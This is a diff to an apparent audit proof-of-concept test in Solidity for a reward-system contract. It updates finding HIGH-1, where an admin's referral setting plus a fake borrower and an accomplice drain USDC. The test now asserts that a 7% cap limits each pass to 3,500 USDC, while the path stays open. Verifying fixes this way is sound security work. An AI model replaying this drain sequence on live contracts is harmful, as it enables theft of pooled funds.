@@ -6,19 +6,21 @@ import "../Setup.sol";
 /// @notice PoC tests for critical/high severity vulnerabilities
 contract CriticalFindingsTest is Setup {
     // ═══════════════════════════════════════════════════════════════
-    //   HIGH-1: MANAGER PRIVILEGE ESCALATION → DRAIN REWARDSYSTEM
-    //   Any manager can set referralPercentage to 100%, create a
-    //   project, invest via an accomplice, and drain RewardSystem USDC.
+    //   HIGH-1: the admin prices an invite, creates a project on a
+    //   borrower of his own and claims the referral out of the reward
+    //   system. Bounded, not closed: the band now stops at 7%, so one
+    //   pass costs the attacker fifteen times the capital it returns.
     // ═══════════════════════════════════════════════════════════════
 
-    function test_HIGH1_adminDrainsRewardSystem() public {
-        // Step 1: Compromised admin sets referral to 100% — the role the parameter sits under.
+    function test_HIGH1_referralCapBoundsTheDrain() public {
+        // Step 1: the admin reaches for 100% and is refused — the band stops at 7%.
         vm.prank(admin);
-        rewardSystem.setParameters(
-            1_000_000,  // referralPercentage = 100% (max allowed)
-            25_000,     // weeklyUnlock
-            40          // vestingWeeks
-        );
+        vm.expectRevert("Referral percentage out of range");
+        rewardSystem.setParameters(1_000_000);
+
+        // What is left is the ceiling, and the rest of the path still works.
+        vm.prank(admin);
+        rewardSystem.setParameters(70_000); // 7%, the most the band allows
 
         // Step 2: Create project with fake borrower
         address fakeBorrower = makeAddr("fakeBorrower");
@@ -42,20 +44,18 @@ contract CriticalFindingsTest is Setup {
         // Step 4: Fund the project
         _fundProject(pid);
 
-        // Step 5: Attacker claims referral USDC from RewardSystem
-        // referralPercentage = 100% → attacker gets 50,000 USDC as referral
+        // Step 5: the referral still pays out of the reward system's own USDC — the path is open,
+        // only the rate is capped. 7% of 50k is 3.5k per pass instead of the whole 50k.
         (uint256 attackerUSDC,,,,) = rewardSystem.getProjectRewards(attacker, pid);
-
-        // CRITICAL: attacker gets 100% of investment amount as referral reward
-        assertEq(attackerUSDC, 50_000e6, "Attacker gets 100% referral");
+        assertEq(attackerUSDC, 3_500e6, "7% of the investment, not 100%");
 
         uint256 rewardBalanceBefore = usdc.balanceOf(address(rewardSystem));
         vm.prank(attacker);
         rewardSystem.claimUSDCForProject(pid);
         uint256 drained = rewardBalanceBefore - usdc.balanceOf(address(rewardSystem));
 
-        assertEq(drained, 50_000e6, "50K USDC drained from RewardSystem");
-        assertEq(usdc.balanceOf(attacker), 50_000e6, "Attacker received 50K USDC");
+        assertEq(drained, 3_500e6, "the cap bounds one pass to 7%");
+        assertEq(usdc.balanceOf(attacker), 3_500e6);
     }
 
     // ═══════════════════════════════════════════════════════════════
